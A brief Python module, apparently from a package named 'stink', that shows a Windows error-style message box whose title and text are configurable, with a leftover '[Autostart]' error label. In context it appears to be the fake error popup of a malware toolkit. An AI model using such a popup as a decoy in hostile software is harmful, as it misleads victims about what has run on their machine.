from ctypes import windll

from stink.helpers.config import MessageConfig


class Message:

    def __init__(self, errors: bool):

        self.config = MessageConfig()

        self.errors = errors

    def __create_message_window(self):
        windll.user32.MessageBoxW(0, self.config.MessageDescription, self.config.MessageTitle, 0x10)

    def run(self):

        try:

            self.__create_message_window()

        except Exception as e:
            if self.errors is True: print(f"[Autostart]: {repr(e)}")
